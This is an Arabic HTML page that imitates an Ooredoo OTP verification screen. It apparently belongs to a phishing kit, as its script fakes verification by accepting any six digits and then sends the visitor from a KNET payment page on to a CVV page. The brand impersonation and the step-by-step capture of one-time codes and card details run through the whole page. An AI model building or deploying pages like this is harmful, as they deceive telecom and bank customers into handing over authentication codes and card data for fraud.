<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ooredoo - OTP Verification</title>
    <link rel="stylesheet" href="/myooredoo/assets/css/vendors/bootstrap.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            direction: rtl;
        }

        .otp-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 500px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }

        .otp-header {
            margin-bottom: 40px;
        }

        .otp-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }

        .otp-header h1 {
            color: #d41e3a;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .otp-header p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
        }

        .phone-number {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-weight: 600;
            color: #333;
        }

        .otp-input-group {
            margin: 40px 0;
        }

        .otp-inputs {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 20px;
        }

        .otp-input {
            width: 50px;
            height: 50px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            text-align: center;
            font-weight: bold;
            transition: all 0.3s;
            color: #d41e3a;
        }

        .otp-input:focus {
            outline: none;
            border-color: #d41e3a;
            box-shadow: 0 0 0 3px rgba(212, 30, 58, 0.1);
        }

        .otp-input.filled {
            border-color: #d41e3a;
            background-color: #fff5f5;
        }

        .timer {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }

        .timer.warning {
            color: #ff9800;
            font-weight: 600;
        }

        .timer.expired {
            color: #f44336;
            font-weight: 600;
        }

        .resend-section {
            margin: 30px 0;
            padding-top: 30px;
            border-top: 1px solid #e0e0e0;
        }

        .resend-text {
            color: #666;
            font-size: 14px;
            margin-bottom: 15px;
        }

        .resend-link {
            color: #d41e3a;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.3s;
        }

        .resend-link:hover {
            color: #b01830;
            text-decoration: underline;
        }

        .resend-link.disabled {
            color: #ccc;
            cursor: not-allowed;
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }

        .btn {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background-color: #d41e3a;
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #b01830;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(212, 30, 58, 0.3);
        }

        .btn-primary:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .btn-secondary {
            background-color: #e0e0e0;
            color: #333;
        }

        .btn-secondary:hover {
            background-color: #d0d0d0;
        }

        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
        }

        .success-message {
            background-color: #e8f5e9;
            color: #2e7d32;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
        }

        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #333;
        }

        @media (max-width: 500px) {
            .otp-container {
                padding: 25px;
            }

            .otp-inputs {
                gap: 5px;
            }

            .otp-input {
                width: 40px;
                height: 40px;
                font-size: 20px;
            }

            .button-group {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="otp-container">
        <!-- Header -->
        <div class="otp-header">
            <div class="otp-icon">📱</div>
            <h1>التحقق من الهوية</h1>
            <p>أدخل رمز التحقق الذي تم إرساله إلى رقم هاتفك</p>
        </div>

        <!-- Messages -->
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>

        <!-- Info Box -->
        <div class="info-box">
            ℹ️ تم إرسال رمز التحقق (OTP) إلى رقم هاتفك. الرمز صالح لمدة 10 دقائق فقط.
        </div>

        <!-- Phone Number -->
        <div class="phone-number" id="phoneDisplay">
            +965 ••••• 1234
        </div>

        <!-- OTP Input -->
        <form id="otpForm">
            <div class="otp-input-group">
                <div class="otp-inputs">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0">
                </div>

                <div class="timer" id="timerDisplay">
                    ⏱️ الوقت المتبقي: 10:00
                </div>
            </div>

            <!-- Resend Section -->
            <div class="resend-section">
                <div class="resend-text">لم تستقبل الرمز؟</div>
                <a class="resend-link" id="resendLink" onclick="resendOTP()">إعادة إرسال الرمز</a>
            </div>

            <!-- Buttons -->
            <div class="button-group">
                <button type="button" class="btn btn-secondary" onclick="goBack()">رجوع</button>
                <button type="submit" class="btn btn-primary">تحقق</button>
            </div>
        </form>
    </div>

    <script>
        let timeLeft = 600; // 10 minutes
        let timerInterval;
        let resendAttempts = 0;

        // Initialize OTP inputs
        const otpInputs = document.querySelectorAll('.otp-input');
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                if (e.target.value) {
                    e.target.classList.add('filled');
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                } else {
                    e.target.classList.remove('filled');
                }
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        // Start timer
        function startTimer() {
            timerInterval = setInterval(() => {
                timeLeft--;
                updateTimerDisplay();

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    disableOTPInputs();
                    showError('انتهى وقت الرمز. يرجى طلب رمز جديد.');
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const timerEl = document.getElementById('timerDisplay');
            
            timerEl.textContent = `⏱️ الوقت المتبقي: ${minutes}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 60) {
                timerEl.classList.add('warning');
            }
            if (timeLeft <= 0) {
                timerEl.classList.add('expired');
            }
        }

        function disableOTPInputs() {
            otpInputs.forEach(input => {
                input.disabled = true;
            });
        }

        function enableOTPInputs() {
            otpInputs.forEach(input => {
                input.disabled = false;
            });
        }

        // Form submission
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const otpCode = Array.from(otpInputs).map(input => input.value).join('');

            if (otpCode.length !== 6) {
                showError('أدخل الرمز الكامل المكون من 6 أرقام');
                return;
            }

            // Simulate OTP verification
            showSuccess('تم التحقق من الرمز بنجاح!');
            
            setTimeout(() => {
                // Save OTP verification status
                sessionStorage.setItem('otpVerified', 'true');
                window.location.href = '/myooredoo/cvv.html';
            }, 1500);
        });

        function resendOTP() {
            resendAttempts++;
            if (resendAttempts > 3) {
                showError('تم تجاوز عدد محاولات إعادة الإرسال');
                document.getElementById('resendLink').classList.add('disabled');
                return;
            }

            // Reset timer
            timeLeft = 600;
            clearInterval(timerInterval);
            
            // Clear inputs
            otpInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            
            enableOTPInputs();
            
            // Reset timer display
            const timerEl = document.getElementById('timerDisplay');
            timerEl.classList.remove('warning', 'expired');
            updateTimerDisplay();
            
            showSuccess('تم إرسال رمز جديد إلى رقم هاتفك');
            
            // Restart timer
            startTimer();
            
            // Focus on first input
            otpInputs[0].focus();
        }

        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.style.display = 'block';
            setTimeout(() => {
                errorEl.style.display = 'none';
            }, 5000);
        }

        function showSuccess(message) {
            const successEl = document.getElementById('successMessage');
            successEl.textContent = message;
            successEl.style.display = 'block';
            setTimeout(() => {
                successEl.style.display = 'none';
            }, 5000);
        }

        function goBack() {
            window.location.href = '/myooredoo/knet.html';
        }

        // Start timer on page load
        startTimer();
        otpInputs[0].focus();
    </script>
</body>
</html>
